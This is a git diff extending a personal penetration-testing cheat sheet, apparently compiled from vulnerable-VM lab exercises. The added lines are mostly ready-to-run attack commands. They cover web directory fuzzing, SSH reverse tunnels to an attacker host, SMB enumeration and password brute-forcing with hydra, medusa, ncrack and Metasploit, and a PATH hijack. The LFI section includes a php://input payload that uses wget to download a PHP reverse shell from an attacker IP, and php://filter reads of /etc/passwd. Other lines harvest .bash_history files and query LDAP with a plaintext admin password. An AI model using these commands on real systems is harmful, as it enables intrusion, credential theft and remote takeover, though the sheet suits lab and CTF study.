@@ -1,13 +1,37 @@
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources
 https://tools.kali.org/tools-listing
 
+
+
+==PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export PATH=/tmp:$PATH
+
+
 ==Web Applications
     -dirb
     -gobuster
     -wfuzz
         wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.38/FUZZ.php
-    -niko
+        wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 --hs "Under" http://192.168.110.48/FUZZ/
+    -niko -h 192.168.110.48
     -uniscan
+
+    ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.110.48/FUZZ/
+    ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.10/FUZZ -e php,html -or -of md -o results.md
+    dirsearch.py -u http://192.168.110.48 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e txt,php -f -x 400,403,404 
+
+# Gobuster 3
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.110.48 -x html,php -t 20
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.10 -x html,php -k
+
+curl -v http://10.10.10.10/robots.txt
+curl -k -v https://10.10.10.10/robots.txt
+curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://10.10.10.10/robots.txt
+
+curl -v -X OPTIONS http://10.10.10.10/test
+
+
 
 
 ===Transfer file with nc
@@ -167,8 +191,9 @@ socat TCP-LISTEN:<<Straylight_TCP_PORT>>,fork,reuseaddr TCP:<<Neuromancer_IP_add
 socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.212.4:8009 &
 
 ==== ssh
-ssh -L 8080:internalTarget:80 user@compromisedMachine
-ssh -L 8080:internalTarget:22 user@compromisedMachine
+ssh -N -f  -L 8080:internalTarget:80 user@compromisedMachine
+ssh -N -f  -L 8080:internalTarget:22 user@compromisedMachine
+ssh -N -f -R 8080:127.0.0.1:8080 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.110.1 -i key
 
 kali> ssh -N -f -L 9000:cible.ip:22 root@pivot.ip
 
@@ -299,14 +324,48 @@ cd /usr/share/metasploit-framework/modules/payloads/singles/cmd/unix
 ===SMB
 https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
 
+enum4linux 192.168.110.46
+nmblookup -A 192.168.1.17
+nbtscan 192.168.1.17
+nbtstat -A 192.168.1.17
+smbmap -H 192.168.110.46
+smbmap -H 192.168.110.46 -u helios -p qwerty
+
+smbclient -L 192.168.110.46
+smbclient //192.168.110.46/helios
+get file.txt
+
 smbclient //10.10.10.9/share$
 
+
+smbclient //192.168.110.46/helios -U helios
+Enter WORKGROUP\helios's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
 smb: \> mask ""
 smb: \> recurse ON
 smb: \> prompt OFF
 smb: \> mget *
 
 
+Password Cracking
+https://www.hackingarticles.in/password-crackingsmb/
+Hydra
+hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 smb
+hydra -e nsr -u -l <username> -P passwd.txt 192.168.1.105 smb -V -f
+Ncrack
+ncrack –U /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.118 –p 445
+Medusa
+medusa -h 192.168.1.118 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M smbnt
+medusa -u <username> -P passwd.txt -h 192.168.1.105 -M smbnt
+
+Metasploit
+use auxiliary/scanner/smb/smb_login
+msf exploit (smb_login)>set rhosts 192.168.1.118
+msf exploit (smb_login)>set user_file /root/Desktop/user.txt
+msf exploit (smb_login)>set pass_file /root/Desktop/pass.txt
+msf exploit (smb_login)>set stop_on_success true
+msf exploit (smb_login)>exploit
 
 ===Wordpress
 $P$BZ9cvCg4NZMOtHvOEhxws.wSX6/OX7. : 123456
@@ -485,6 +544,7 @@ steghide
     steghide extract -sf <media filename>
     steghide embed -ef <txt filename> -cf <media filename> -p  <password>
     steghide info <media filename>
+ stepic -d -i kvasir.png | xxd -p -r > k.png
 
 ==wordslist
 
@@ -560,7 +620,26 @@ gdb-peda$ find "\xff\xd4" binary
 
 gdb-peda$ find "\xff\xe4" binary
 
-===LFI Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)
+=== Local File Inclusion (LFI) Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)
+https://highon.coffee/blog/lfi-cheat-sheet/
+
+Path Traversal aka Directory Traversal
+    /etc/passwd
+    ../../../etc/passwd
+PHP Wrapper expect:// LFI
+    http://127.0.0.1/fileincl/example1.php?page=expect://ls
+
+PHP Wrapper php://input
+    http://192.168.183.128/fileincl/example1.php?page=php://input
+    post data payload : <? system('uname -a');?>
+                        <? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
+
+PHP Wrapper php://filter
+    http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+
+/proc/self/environ LFI Method
+/proc/self/fd/ LFI Method
+
 https://tools.kali.org/web-applications/uniscan
 sudo uniscan
 
@@ -772,3 +851,16 @@ for i in $(seq 1 65535); do nc -z -v 192.168.2.200 $i 2>&1 | grep 'open'; done
 
 ==
 find  /home -name ".bash_history" 2>/dev/null -exec cat {} \;
+
+
+
+===LDAP
+
+ldapsearch -x -LLL -h 192.168.110.51 -D 'cn=admin,dc=symfonos,dc=local' -w 'qMDdyZh3cT6eeAWD' -b 'dc=symfonos,dc=local'
+nmap 192.168.110.51 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"' 
+
+
+
+=== Peut-être
+for file in $(find . -name '*.php'); do cat $file; done
+grep -Er '(preg_replace|phpinfo()|system)' * | grep '.php:'
